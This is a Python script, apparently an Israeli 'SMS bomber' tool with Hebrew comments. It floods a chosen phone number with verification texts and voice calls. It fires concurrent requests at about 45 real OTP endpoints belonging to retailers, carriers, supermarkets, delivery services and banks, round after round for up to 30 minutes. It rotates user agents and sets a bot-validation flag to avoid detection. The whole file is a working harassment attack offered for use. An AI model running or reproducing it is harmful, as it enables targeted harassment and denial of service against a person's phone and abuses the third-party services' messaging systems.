import requests
import asyncio
import random
import os
import sys
import json
from datetime import datetime, timedelta
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# ניסיון לייבא צבעים לעיצוב בטרמינל
try:
    from colorama import Fore, Style, init
    init()
    R = Fore.RED
    G = Fore.GREEN
    C = Fore.CYAN
    W = Fore.WHITE
    Y = Fore.YELLOW
    M = Fore.MAGENTA
    B = Style.BRIGHT
    RESET = Style.RESET_ALL
except ImportError:
    R = G = C = W = Y = M = B = RESET = ""

# באנר פתיחה
BANNER = f"""
{M}{B}╔══════════════════════════════════════╗
║     OMNI-TOTAL-WAR SMS BOMBER v5    ║
║         By Asaf | CyberIL            ║
║     [NO PROXY - MAX SPEED MODE]      ║
╚══════════════════════════════════════╝{RESET}
"""

# יוזר אייג'נטים - מעודכן ומורחב
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

# API LIST - מעודכן ומשופר
APIS = [
    # מג'נטו - אתרי אופנה
    {"name": "Delta", "url": "https://www.delta.co.il/customer/ajax/post/", "type": "magento", "active": True},
    {"name": "Timberland", "url": "https://www.timberland.co.il/customer/ajax/post/", "type": "magento", "active": True},
    {"name": "Castro", "url": "https://www.castro.com/customer/ajax/post/", "type": "magento", "active": True},
    {"name": "Fox", "url": "https://www.foxhome.co.il/customer/ajax/post/", "type": "magento", "active": True},
    {"name": "TerminalX", "url": "https://www.terminalx.com/customer/ajax/post/", "type": "magento", "active": True},
    {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "magento", "active": True},
    {"name": "Gali", "url": "https://www.gali.co.il/customer/ajax/post/", "type": "magento", "active": True},
    {"name": "Hoodies", "url": "https://www.hoodies.co.il/customer/ajax/post/", "type": "magento", "active": True},
    {"name": "Laline", "url": "https://www.laline.co.il/customer/ajax/post/", "type": "magento", "active": True},
    {"name": "Renoir", "url": "https://www.renuar.co.il/customer/ajax/post/", "type": "magento", "active": True},
    {"name": "Buffalo", "url": "https://www.buffalo.co.il/customer/ajax/post/", "type": "magento", "active": True},
    {"name": "Gefen", "url": "https://www.gefen.co.il/customer/ajax/post/", "type": "magento", "active": True},
    {"name": "RedHot", "url": "https://www.redhot.co.il/customer/ajax/post/", "type": "magento", "active": True},
    {"name": "Avramito", "url": "https://www.avramito.co.il/customer/ajax/post/", "type": "magento", "active": True},
    {"name": "NineWest", "url": "https://www.nine-west.co.il/customer/ajax/post/", "type": "magento", "active": True},
    {"name": "Aldo", "url": "https://www.aldoshoes.co.il/customer/ajax/post/", "type": "magento", "active": True},
    
    # SMS APIs - חברות סלולר
    {"name": "Cellcom", "url": "https://digital-api.cellcom.co.il/api/otp/LoginStep1", "method": "PUT", "data": {"Subscriber": "PHONE", "IsExtended": False, "ProcessType": "", "OtpOrigin": "main OTP"}, "active": True},
    {"name": "Partner", "url": "https://my.partner.co.il/api/send-verification-code", "data": {"phone": "PHONE"}, "active": True},
    {"name": "Pelephone", "url": "https://my.pelephone.co.il/api/send-sms", "data": {"phone": "PHONE"}, "active": True},
    {"name": "Hot", "url": "https://hot-api.hotmobile.co.il/api/auth/send-code", "data": {"phoneNumber": "PHONE_RAW"}, "active": True},
    {"name": "Bezeq", "url": "https://www.bezeq.co.il/api/v1/auth/request-code", "data": {"phone": "PHONE_RAW"}, "active": True},
    
    # סופרים
    {"name": "Shufersal", "url": "https://www.shufersal.co.il/api/v1/auth/otp", "data": {"phone": "PHONE_RAW"}, "active": True},
    {"name": "RamiLevi", "url": "https://www.rami-levy.co.il/api/auth/sms", "data": {"phone": "PHONE"}, "active": True},
    {"name": "SuperPharm", "url": "https://www.super-pharm.co.il/api/sms", "data": {"phone": "PHONE"}, "active": True},
    {"name": "Victory", "url": "https://www.victory.co.il/api/auth/sms", "data": {"phone": "PHONE"}, "active": True},
    
    # אוכל ומשלוחים
    {"name": "Wolt", "url": "https://restaurant-api.wolt.com/v1/auth/request-login-code", "data": {"phone_number": "PHONE_INTL"}, "active": True},
    {"name": "10bis", "url": "https://www.10bis.co.il/NextApi/SendTwoStepVerificationCode", "data": {"phone": "PHONE"}, "active": True},
    {"name": "Dominos", "url": "https://www.dominos.co.il/api/auth/sms", "data": {"phone": "PHONE"}, "active": True},
    {"name": "Burgeranch", "url": "https://app.burgeranch.co.il/_a/aff_otp_auth", "data": {"phone": "PHONE"}, "is_json": False, "active": True},
    {"name": "McDonalds", "url": "https://mcdonalds.co.il/api/auth/sms", "data": {"phone": "PHONE"}, "active": True},
    {"name": "KFC", "url": "https://www.kfc.co.il/api/auth/sms", "data": {"phone": "PHONE"}, "active": True},
    
    # יד2 וזאפ
    {"name": "Yad2", "url": "https://www.yad2.co.il/api/auth/register", "data": {"phone": "PHONE", "action": "send_sms"}, "active": True},
    {"name": "Zap", "url": "https://www.zap.co.il/api/auth/sms", "data": {"phone": "PHONE"}, "active": True},
    
    # חנייה ותחבורה
    {"name": "Pango", "url": "https://api.pango.co.il/auth/otp", "data": {"phoneNumber": "PHONE_RAW"}, "active": True},
    {"name": "Cellopark", "url": "https://cellopark.co.il/api/sms/send", "data": {"phone": "PHONE"}, "active": True},
    
    # שירותים נוספים
    {"name": "MyOfer", "url": "https://server.myofer.co.il/api/sendAuthSms", "data": {"phoneNumber": "PHONE"}, "active": True},
    {"name": "Ivory", "url": "https://www.ivory.co.il/user/login/sendCodeSms/", "type": "get", "active": True},
    {"name": "Globes", "url": "https://www.globes.co.il/news/login-2022/ajax_handler.ashx", "data": {"value": "PHONE", "value_type": "154"}, "is_json": False, "active": True},
    {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "data": {"value": "PHONE", "type": "phone", "projectId": "1"}, "active": True},
    
    # Voice APIs - בנקים
    {"name": "Hapoalim", "url": "https://login.bankhapoalim.co.il/api/otp/send", "data": {"phone": "PHONE_INTL", "sendVoice": True}, "active": True},
    {"name": "Leumi", "url": "https://api.leumi.co.il/api/otp/send", "data": {"phone": "PHONE_INTL", "voice": True}, "active": True},
    {"name": "Discount", "url": "https://api.discountbank.co.il/auth/otp", "data": {"phoneNumber": "PHONE_RAW", "method": "voice"}, "active": True},
    {"name": "Mizrahi", "url": "https://api.mizrahi-tefahot.co.il/auth/otp", "data": {"phone": "PHONE_RAW", "type": "voice"}, "active": True},
    {"name": "Massad", "url": "https://www.massad.co.il/api/otp/send", "data": {"phone": "PHONE_RAW", "voice": True}, "active": True},
    {"name": "Yahav", "url": "https://www.yahav.co.il/api/auth/voice", "data": {"phone": "PHONE_RAW"}, "active": True},
]

def format_phone(phone):
    """פורמט מספר טלפון"""
    # מסיר תווים לא מספריים
    phone = ''.join(filter(str.isdigit, phone))
    
    # אם מתחיל ב-0, מסיר אותו
    if phone.startswith('0'):
        phone = phone[1:]
    
    # מוסיף 972 אם צריך
    if not phone.startswith('972'):
        phone = '972' + phone
    
    phone_raw = phone[3:]  # מסיר 972
    phone_intl = f"+{phone}"
    
    return phone, phone_raw, phone_intl

def send_magento(api, phone_raw):
    """שליחת בקשת מג'נטו"""
    if not api.get("active", True):
        return False, api["name"]
    
    data = {
        "type": "login",
        "telephone": phone_raw,
        "bot_validation": 1,
        "code": "",
        "compare_email": "",
        "compare_identity": ""
    }
    
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": api["url"].replace("/customer/ajax/post/", ""),
        "Referer": api["url"].replace("/customer/ajax/post/", "/")
    }
    
    try:
        # timeout קצר יותר בשביל מהירות
        r = requests.post(api["url"], data=data, headers=headers, timeout=2)
        return r.status_code in [200, 201, 202, 204], api["name"]
    except:
        return False, api["name"]

def send_api(api, phone, phone_raw, phone_intl):
    """שליחת בקשת API כללית"""
    if not api.get("active", True):
        return False, api["name"]
    
    try:
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "Origin": api["url"].split("/api")[0] if "/api" in api["url"] else "",
        }
        
        # טיפול במקרים מיוחדים
        if api.get("type") == "get":
            url = api["url"] + phone
            r = requests.get(url, headers=headers, timeout=2)
            return r.status_code in [200, 201, 202, 204], api["name"]
        
        # החלפת משתנים בנתונים
        if "data" in api:
            data_str = json.dumps(api["data"])
            data_str = data_str.replace("PHONE", phone)
            data_str = data_str.replace("PHONE_RAW", phone_raw)
            data_str = data_str.replace("PHONE_INTL", phone_intl)
            data = json.loads(data_str)
        else:
            data = {}
        
        # בחירת מתודה
        method = api.get("method", "POST")
        is_json = api.get("is_json", True)
        
        # שליחה - timeout קצר
        if method == "GET":
            r = requests.get(api["url"], headers=headers, timeout=2)
        elif method == "PUT":
            r = requests.put(api["url"], json=data, headers=headers, timeout=2)
        else:
            if is_json:
                r = requests.post(api["url"], json=data, headers=headers, timeout=2)
            else:
                r = requests.post(api["url"], data=data, headers=headers, timeout=2)
        
        return r.status_code in [200, 201, 202, 204], api["name"]
    except:
        return False, api["name"]

def fire_round_sync(phone, phone_raw, phone_intl):
    """סיבוב שליחות סינכרוני - רץ ב-ThreadPool"""
    results = []
    
    for api in APIS:
        if api.get("type") == "magento":
            success, name = send_magento(api, phone_raw)
        else:
            success, name = send_api(api, phone, phone_raw, phone_intl)
        
        if success:
            results.append(name)
    
    return len(results), len(APIS), results

def worker(api, phone, phone_raw, phone_intl):
    """פונקציית עובדת ל-ThreadPoolExecutor"""
    if api.get("type") == "magento":
        return send_magento(api, phone_raw)
    else:
        return send_api(api, phone, phone_raw, phone_intl)

async def fire_round_async(phone, phone_raw, phone_intl):
    """סיבוב שליחות אסינכרוני עם ThreadPoolExecutor"""
    loop = asyncio.get_event_loop()
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        tasks = [
            loop.run_in_executor(executor, worker, api, phone, phone_raw, phone_intl)
            for api in APIS
        ]
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
    
    successful = []
    for r in results:
        if isinstance(r, tuple) and r[0] is True:
            successful.append(r[1])
    
    return len(successful), len(APIS), successful

async def check_apis():
    """בדיקת APIs עובדים"""
    test_phone, test_raw, test_intl = format_phone("0501234567")
    working = []
    
    print(f"{Y}[*] בודק APIs (בלי פרוקסי)...{RESET}")
    
    success, total, successful_apis = await fire_round_async(test_phone, test_raw, test_intl)
    
    return successful_apis

async def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)
    
    active_apis = [api for api in APIS if api.get("active", True)]
    print(f"{C}[i] סה\"כ APIs פעילים: {len(active_apis)}/{len(APIS)}{RESET}")
    print(f"{G}[i] מצב: NO PROXY - מהירות מקסימלית{RESET}")
    print()
    
    # קלט מספר טלפון
    target = input(f"{Y}[?] מספר טלפון יעד (05XXXXXXXX): {W}")
    phone, phone_raw, phone_intl = format_phone(target)
    
    if len(phone_raw) != 9:  # 05X אחרי הסרת 972
        print(f"{R}[!] מספר לא תקין. נא להזין 10 ספרות{RESET}")
        return
    
    # קלט זמן
    try:
        duration = int(input(f"{Y}[?] זמן הפעלה בדקות (1-30): {W}"))
        if duration < 1 or duration > 30:
            duration = 5
            print(f"{Y}[i] ברירת מחדל: 5 דקות{RESET}")
    except:
        duration = 5
        print(f"{Y}[i] ברירת מחדל: 5 דקות{RESET}")
    
    # קלט אינטרוול (אופציונלי)
    try:
        interval = float(input(f"{Y}[?] אינטרוול בין סיבובים בשניות (0.1-2, 0 = מקסימום מהירות): {W}"))
        if interval < 0:
            interval = 0
        if interval > 2:
            interval = 0.5
    except:
        interval = 0.3
    
    # בדיקת APIs לפני התחלה
    print(f"\n{Y}[*] מפעיל מנוע מהירות...{RESET}")
    working_apis = await check_apis()
    print(f"{G}[+] נמצאו {len(working_apis)} APIs עובדים{RESET}")
    
    # התחלת המתקפה
    end_time = datetime.now() + timedelta(minutes=duration)
    total_sent = 0
    rounds = 0
    success_history = []
    
    print(f"\n{G}[+] ההפצצה החלה על {phone_intl}")
    print(f"{C}[!] לחץ Ctrl+C להפסקה{RESET}\n")
    print(f"{C}{'─'*60}{RESET}")
    
    try:
        while datetime.now() < end_time:
            rounds += 1
            start_round = time.time()
            
            # שליחת הסיבוב
            success, total, successful_apis = await fire_round_async(phone, phone_raw, phone_intl)
            total_sent += success
            success_history.append(success)
            
            # חישוב זמן סיבוב
            round_time = time.time() - start_round
            
            # חישוב סטטיסטיקות
            timestamp = datetime.now().strftime("%H:%M:%S")
            remaining = (end_time - datetime.now()).seconds // 60
            remaining_seconds = (end_time - datetime.now()).seconds % 60
            
            # ממוצע אחרון
            if len(success_history) > 5:
                avg_last = sum(success_history[-5:]) / 5
            else:
                avg_last = success
            
            # קצב לדקה
            elapsed = (datetime.now() - (end_time - timedelta(minutes=duration))).total_seconds()
            rate = total_sent / elapsed * 60 if elapsed > 0 else 0
            
            # הדפסה צבעונית
            print(f"{W}[{timestamp}] ", end="")
            print(f"{G}✓ {success}/{total} ", end="")
            
            if success > total * 0.7:
                print(f"{G}🔥 ", end="")
            elif success > total * 0.4:
                print(f"{Y}⚡ ", end="")
            else:
                print(f"{R}💤 ", end="")
            
            print(f"{C}| סה\"כ: {total_sent} ", end="")
            print(f"| {rate:.0f}/דקה ", end="")
            print(f"| זמן סיבוב: {round_time:.2f}ש ", end="")
            print(f"| נותר: {remaining:02d}:{remaining_seconds:02d}{RESET}")
            
            # אינטרוול - אם נבחר 0, ממשיכים מיד
            if interval > 0 and datetime.now() < end_time:
                await asyncio.sleep(interval)
    
    except KeyboardInterrupt:
        print(f"\n{R}[!] הופסק על ידי המשתמש{RESET}")
    
    # סיכום מתקדם
    print(f"\n{C}{'═'*60}{RESET}")
    print(f"{G}✅ סיכום מתקפה:{RESET}")
    print(f"   📱 יעד: {phone_intl}")
    print(f"   ⏱️  זמן: {duration} דקות")
    print(f"   📊 סה\"כ נשלח: {total_sent} הודעות")
    print(f"   🔄 סבבים: {rounds}")
    print(f"   ⚡ ממוצע לדקה: {total_sent/duration:.1f}")
    print(f"   🎯 ממוצע לסיבוב: {total_sent/rounds:.1f}")
    
    if success_history:
        print(f"   💪 סיבוב שיא: {max(success_history)}")
        print(f"   📉 סיבוב שפל: {min(success_history)}")
    
    print(f"{C}{'═'*60}{RESET}")
    
    # שמירת לוג (אופציונלי)
    save_log = input(f"\n{Y}[?] לשמור לוג? (y/n): {W}").lower()
    if save_log == 'y':
        filename = f"sms_log_{phone_raw}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"תאריך: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"יעד: {phone_intl}\n")
            f.write(f"זמן: {duration} דקות\n")
            f.write(f"נשלח: {total_sent} הודעות\n")
            f.write(f"ממוצע: {total_sent/duration:.1f} לדקה\n")
        print(f"{G}[+] לוג נשמר כ-{filename}{RESET}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{R}[!] יציאה...{RESET}")
    except Exception as e:
        print(f"\n{R}[!] שגיאה: {e}{RESET}")
        import traceback
        traceback.print_exc()
